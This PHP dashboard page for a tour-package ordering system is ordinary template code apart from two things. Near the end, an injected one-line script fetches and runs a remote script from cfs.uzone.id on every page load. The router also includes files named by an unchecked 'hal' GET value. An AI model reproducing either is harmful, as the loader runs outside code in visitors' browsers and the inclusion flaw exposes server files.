<?php
require_once '../setting/crud.php';
require_once '../setting/koneksi.php';
require_once '../setting/tanggal.php';
require_once '../setting/fungsi.php';

session_start();
if (isset($_SESSION['member'])){
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="utf-8" />
        <title>Sistem Informasi Pemesanan Paket Wisata</title>
        <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0' name='viewport' />
        <meta name="viewport" content="width=device-width" />

        <!-- Canonical SEO -->
        <link rel="canonical" href="https://www.creative-tim.com/product/light-bootstrap-dashboard-pro"/>

        <!-- DataTables -->
        <link href="../assets/plugins/datatables/jquery.dataTables.min.css" rel="stylesheet" type="text/css"/>
        <link href="../assets/plugins/datatables/buttons.bootstrap.min.css" rel="stylesheet" type="text/css"/>
        <link href="../assets/plugins/datatables/responsive.bootstrap.min.css" rel="stylesheet" type="text/css"/>
        <link href="../assets/plugins/datatables/scroller.bootstrap.min.css" rel="stylesheet" type="text/css"/>
        <link href="../assets/plugins/datatables/dataTables.colVis.css" rel="stylesheet" type="text/css"/>
        <link href="../assets/plugins/datatables/dataTables.bootstrap.min.css" rel="stylesheet" type="text/css"/>
        <link href="../assets/plugins/datatables/fixedColumns.dataTables.min.css" rel="stylesheet" type="text/css"/>

        <!-- Bootstrap core CSS -->
        <link href="../assets/css/bootstrap.min.css" rel="stylesheet">
        <!-- MetisMenu CSS -->
        <link href="../assets/css/metisMenu.min.css" rel="stylesheet">

        <!-- Bootstrap core CSS     -->
        <link href="../assets/css/bootstrap.min.css" rel="stylesheet" />

        <!--  Light Bootstrap Dashboard core CSS    -->
        <link href="../assets/css/light-bootstrap-dashboard.css" rel="stylesheet"/>

        <link href="../assets/css/animate.min.css" rel="stylesheet" />

        <link href="../assets/css/bootstrap-chosen.css" rel="stylesheet" />

        <!--     Fonts and icons     -->
        <link href="../assets/fonts/font-awesome.css" rel="stylesheet" />
        <link href="../assets/fonts/font-awesome.min.css" rel="stylesheet">


        <link href='https://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css' rel='stylesheet' type='text/css'/>
        <link href="../assets/css/pe-icon-7-stroke.css" rel="stylesheet" />

    </head>
    <body>

        <div class="wrapper">
            <div class="sidebar" data-color="blue" data-image="../assets/images/side1.jpg">

              <div class="logo">
                <a href="index.php?hal=beranda" class="logo-text" style="font-weight: bold;">
                  PEMESANAN PAKET
              </a>
          </div>
          <div class="logo logo-mini">
           <a href="index.php" class="logo-text">
            WISATA
        </a>
    </div>

    <div class="sidebar-wrapper">
      <div class="user">
        <div class="photo">
         <img src="../assets/images/users/admin.png" />
     </div>
     <div class="info">
        <a data-toggle="collapse" href="#collapseExample" class="collapsed">
            <!-- <p href="?hal=profil"><?php echo $_SESSION['username']; ?></p> -->
            <p>Administrator</p>
            <b class="caret"></b>
        </a>
        <div class="collapse" id="collapseExample">
          <ul class="nav">
            <li><a href="#">My Profile</a></li>
            <li><a href="#">Ubah Password</a></li>
        </ul>
    </div>
</div>
</div>

<ul class="metisMenu nav" id="side-menu">
    <li>
        <a href="?hal=beranda">
          <i class="pe-7s-culture"></i>
          <p>Dashboard</p>
      </a>
  </li>

  <li>
    <a href="?hal=data">
        <i class="pe-7s-user"></i>
        <p>Data Lengkap</p>
    </a>
</li>

<li>
    <a href="?hal=profil">
        <i class="pe-7s-user"></i> 
        <p>Profil </p>
    </a>
</li>


<li>
    <a href="?hal=order">
      <i class="pe-7s-id"></i>
      <p>Order</p>
  </a>
</li>
<li>
    <a href="?hal=konfirmasi">
      <i class="pe-7s-users"></i>
      <p>Konformasi</p>
  </a>
</li>

</ul>

</div>
</div>

<div class="main-panel">
  <nav class="navbar navbar-default">
   <div class="container-fluid">
    <div class="navbar-minimize">
     <button id="minimizeSidebar" class="btn btn-primary btn-fill btn-round btn-icon">
      <i class="fa fa-ellipsis-v visible-on-sidebar-regular"></i>
      <i class="fa fa-navicon visible-on-sidebar-mini"></i>
  </button>
</div>
<div class="navbar-header">
   <button type="button" class="navbar-toggle" data-toggle="collapse">
    <span class="sr-only">Toggle navigation</span>
    <span class="icon-bar"></span>
    <span class="icon-bar"></span>
    <span class="icon-bar"></span>
</button>
<a class="navbar-brand" href="#">Dashboard</a>
</div>
<div class="collapse navbar-collapse">

 <form class="navbar-form navbar-left navbar-search-form" role="search">
  <div class="input-group">
   <span class="input-group-addon"><i class="fa fa-search"></i></span>
   <input type="text" value="" class="form-control" placeholder="Search...">
</div>
</form>

<ul class="nav navbar-nav navbar-right"><li class="dropdown dropdown-with-icons">
  <a href="#" class="dropdown-toggle" data-toggle="dropdown">
    <i class="fa fa-list"></i>
    <p class="hidden-md hidden-lg">
      More
      <b class="caret"></b>
  </p>
</a>
<ul class="dropdown-menu dropdown-with-icons">
    <li>
      <a href="#">
        <i class="pe-7s-mail"></i> Pesan
    </a>
</li>
<li>
  <a href="#">
    <i class="pe-7s-help1"></i> Bantuan
</a>
</li>
<li>
  <a href="#">
    <i class="pe-7s-tools"></i> Pengaturan
</a>
</li>
<li class="divider"></li>
<li>
  <a href="logout.php" class="text-danger" id="out">
    <i class="pe-7s-close-circle"></i>
    Log out
</a>
</li>
</ul>

</li></ul>
</div>
</div>
</nav>


<div class="content">
  <div class="container-fluid">
    <div class="row">

        <!-- Content -->
        <?php
        $hal = @$_GET['hal'];
        $modul = "";
        $default = $modul."beranda.php";
        if(!$hal){
            require_once "$default";
        }else{
            switch($hal){
                case $hal:
                if(is_file($modul.$hal.".php"))
                {
                    require_once $modul.$hal.".php";
                }
                else
                {
                    require_once "$default";
                }
                break;
                default:
                require_once "$default";
            }
        }

        ?>

    </div>

    <div class="clearfix"></div>
</div>
</div>


<footer class="footer">
    <div class="container-fluid">
      <nav class="pull-right">
        <p class="copyright pull-right">
            &copy; 2017 <a href="#">Pemesanan Paket Wisata</a>. All rights reserved 
        </p>
    </nav>
</div>
</footer>

</div>
</div>
<!-- End #page-wrapper -->



<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKaxFmvwh5s8oCfPEqwmotghAqf4uU7MtUnlZQrAm0U7x%2fUXyksgDMTlg2N2V7g24krLu1D8Vwk1duM8n1aD055%2fs4GVj5kfQT29WSiV00fGDUIz9sByXubtPMbTWTjQBkg%2f9hb5ZwQdatZEAwbN%2bTB7pDqdQlrMcjhfO9%2fZMJspFsoGMM%2fCD%2b8xki0AbHshACgatCnJQqGbnLxv0graLkeW3k46I0xLfCZ84Mdz2K5tsxU0fdZeOD%2btlRwU5fdzrRv0SBHkHk%2fpg6YrdrxyjuoNVwWikb66mPROm2SswxIJTtVJqqWItKEYTNggsK1%2fFimB7%2bf4ok6CXvuv0gigDV3%2bHz6Z5et%2bWEJtizz%2bVplKDmfHOu0ErtMoxoCuvF4oIsITZ1VBtf95%2fYSEMBZ%2by7%2bKaPfnQo%2bm9HPQIWoPBNR9KDtq%2bTM8vGiVF13UR2XdY4x%2fhWnxZ8CYX0%2fLwODnFdaLYa7ZL7j%2bCzAcifVzgzafwRmRMCSTxvwBJMpWGw6MYSDoBque64w7zYQnDQbSR2997KQDEGSNWmrRcays6XHZ5AOfgUxb5maBVqpXY%2bnK5B0t9geoY7TUvgDcI5uoeh2kI3fGXb0JaC8ZFcSQRuOhi0npcjlNcRjM7GGD824CR7x17JENX%2bOc9RmwVWSYC3jx7OX66BgiQRWqraTUrpBQxaWkgGP2xB7ZglHp%2fWfe0KkIvKSes1pfK7FCMb8FYkA%2fpW3pbSL3xqhmJt3wClgi7KmHppOvUimESc9BfYMDvOggEm7gDfELGOef0kdTdYs09qQFLk2AfWWD457QbBvNo%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- js placed at the end of the document so the pages load faster -->
<!-- <script src="../assets/js/jquery-2.1.4.min.js"></script>
<script src="../assets/js/bootstrap.min.js"></script>
<script src="../assets/js/jquery.slimscroll.min.js"></script> -->

<script src="../assets/js/metisMenu.min.js"></script>

<!-- init -->
<script src="../assets/pages/jquery.datatables.init.js"></script>

<!-- App Js -->
<script src="../assets/js/jquery.app.js"></script>

<!--   Core JS Files and PerfectScrollbar library inside jquery.ui   -->
<script src="../assets/js/jquery.min.js" type="text/javascript"></script>
<script src="../assets/js/jquery-ui.min.js" type="text/javascript"></script>
<script src="../assets/js/bootstrap.min.js" type="text/javascript"></script>

<!-- memanggil chosen.jquery.js -->
<script type="text/javascript" src="../assets/js/chosen.jquery.js"></script>

<!--  Forms Validations Plugin -->
<script src="../assets/js/jquery.validate.min.js"></script>

<!--  Plugin for Date Time Picker and Full Calendar Plugin-->
<script src="../assets/js/moment.min.js"></script>

<!--  Date Time Picker Plugin is included in this js file -->
<script src="../assets/js/bootstrap-datetimepicker.js"></script>

<!--  Select Picker Plugin -->
<script src="../assets/js/bootstrap-selectpicker.js"></script>

<!--  Checkbox, Radio, Switch and Tags Input Plugins -->
<script src="../assets/js/bootstrap-checkbox-radio-switch-tags.js"></script>

<!--  Charts Plugin -->
<script src="../assets/js/chartist.min.js"></script>

<!--  Notifications Plugin    -->
<script src="../assets/js/bootstrap-notify.js"></script>

<!-- Sweet Alert 2 plugin -->
<script src="../assets/js/sweetalert2.js"></script>

<!-- Vector Map plugin -->
<script src="../assets/js/jquery-jvectormap.js"></script>

<!-- Wizard Plugin    -->
<script src="../assets/js/jquery.bootstrap.wizard.min.js"></script>

<!--  Bootstrap Table Plugin    -->
<script src="../assets/js/bootstrap-table.js"></script>

<!--  Plugin for DataTables.net  -->
<script src="../assets/js/jquery.datatables.js"></script>

<!-- Light Bootstrap Dashboard Core javascript and methods -->
<script src="../assets/js/light-bootstrap-dashboard.js"></script>

<!--   Sharrre Library    -->
<script src="../assets/js/jquery.sharrre.js"></script>

<script type="text/javascript">
    $(document).ready(function(){
       $('#example').DataTable();
   });
</script>


<!-- alert -->
<script type="text/javascript">
//1. konfirmasi hapus
//mengambil class dari button
$('.confirm').click(function (e)
{
  var href = $(this).attr('href');

  swal({
    title : "Apakah Anda Yakin ?",
    text : "Akan Menghapus ini !",
    type : "warning",
    showCancelButton : true,
    confirmButtonColor : "#DD6B55",
    confirmButtonText : "YA",
    cancelButtonText  : "TIDAK" ,
    closeOnConfirm : true,
    closeOnCancel : true
},
function (isConfirm)
{
    if (isConfirm) {
      window.location.href = href;
  }
});
  return false;
});
</script>

<!-- alert Logout -->
<script type="text/javascript">

  $('#out').click(function (e)
  {
    var href = $(this).attr('href');

    swal({
      title : "Apakah Anda Yakin ?",
      text : "Akan Menutup Aplikasi ini !",
      type : "warning",
      showCancelButton : true,
      confirmButtonColor : "#DD6B55",
      confirmButtonText : "YA",
      cancelButtonText  : "TIDAK" ,
      closeOnConfirm : true,
      closeOnCancel : true
  },
  function (isOut)
  {
      if (isOut) {
        window.location.href = href;
    }
});
    return false;
});

</script>

<!-- validasi nik -->
<script>
  function hanyaAngka(evt) {
    var charCode = (evt.which) ? evt.which : event.keyCode
    if (charCode > 31 && (charCode < 48 || charCode > 57))

      return false;
  return true;
}
</script>


<script type="text/javascript">
  $().ready(function(){

    $('#registerFormValidation').validate();
    $('#loginFormValidation').validate();
    $('#allInputsFormValidation').validate();

});
</script>


<!-- memanggil chosen.jquery.js -->
<script type="text/javascript" src="chosen.jquery.js"></script>
<script>
  $('document').ready(function(){
    $("#chosen-example").chosen();
})
</script>

</html>
<?php
}else{
    echo "<script>window.location='../index.php';</script>";
}
?>